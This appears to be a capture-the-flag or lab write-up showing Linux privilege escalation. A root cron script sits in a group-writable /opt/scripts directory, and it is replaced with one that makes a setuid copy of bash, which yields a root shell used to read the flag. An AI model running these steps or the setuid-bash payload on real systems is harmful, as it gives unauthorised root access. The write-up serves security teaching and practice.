## Write-up

### Steps to execute Example 2 from the technique

1. First, make sure that the `cron` scheduler is running:

```bash
user@Linux:/home/user$ ps -efw | grep -i "cron"
root         576       1  0 12:20 ?        00:00:00 /usr/sbin/cron -f
user       80321   36193  0 15:00 pts/0    00:00:00 grep --color=auto -i cron
```

2. Run the `pspy` utility to find running processes on the system:

```bash
user@Linux:/home/user$ ./pspy
pspy - version: 1.2.1 - Commit SHA: kali


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
...
2024/07/22 15:05:26 CMD: UID=0     PID=1224661    | /usr/sbin/cron -f
2024/07/22 15:05:26 CMD: UID=0     PID=1224663    | /bin/bash /opt/scripts/connect.sh
2024/07/22 15:05:26 CMD: UID=0     PID=1224662    | /bin/sh -c /bin/bash -c /opt/scripts/connect.sh
2024/07/22 15:05:26 CMD: UID=0     PID=1224664    | ping -q -c 1 -W 1 8.8.8.8
2024/07/22 15:08:26 CMD: UID=0     PID=1224671    | /usr/sbin/cron -f
2024/07/22 15:08:26 CMD: UID=0     PID=1224673    | /bin/bash /opt/scripts/connect.sh
2024/07/22 15:08:26 CMD: UID=0     PID=1224677    | /bin/sh -c /bin/bash -c /opt/scripts/connect.sh
2024/07/22 15:08:26 CMD: UID=0     PID=1224678    | ping -q -c 1 -W 1 8.8.8.8
...
```

3. Now check the permissions for the `/opt/scripts` directory and the `connect.sh` file:

```bash
user@Linux:/home/user$ ls -l /opt | grep "scripts"
drwxrwxr-x 2 root user 4096 Jun 12 12:12 scripts
user@Linux:/home/user$ ls -l /opt/scripts | grep "connect.sh"
-rwxr-xr-x 1 root root 123 Jun 12 12:13 connect.sh
user@Linux:/home/user$ cat connect.sh
#!/bin/bash

if ping -q -c 1 -W 8.8.8.8 >/dev/null; then
  echo "IPv4 is currently up" > /root/ip_status.txt
else
  echo "IPv4 is currently down" > /root/ip_status.txt
fi
```

4. Obviously, the file cannot be directly overwritten, but it can be deleted, replaced with a new one, and given execute permissions:

```bash
user@Linux:/home/user$ rm /opt/scripts/connect.sh
user@Linux:/home/user$ nano /opt/scripts/connect.sh
#!/bin/bash

cp /bin/bash /tmp && chmod +s /tmp/bash
user@Linux:/home/user$ chmod 755 /opt/scripts/connect.sh
```

5. Within a minute, the script will be executed, after which privileges on the system will be escalated:

```bash
user@Linux:/home/user$ /tmp/bash -p
bash-5.2# whoami
root
```

To get the flag, read it using `cat`:
```bash
bash-5.2# cat /root/flag
```

### Result description

Despite lacking access to the `/var/spool/cron/crontabs` directory and the absence of tasks in `/etc/crontab`, running `cron jobs` were discovered that could not be accessed directly. By modifying the script executed by the `cron job`, the attacker was able to escalate privileges on the system.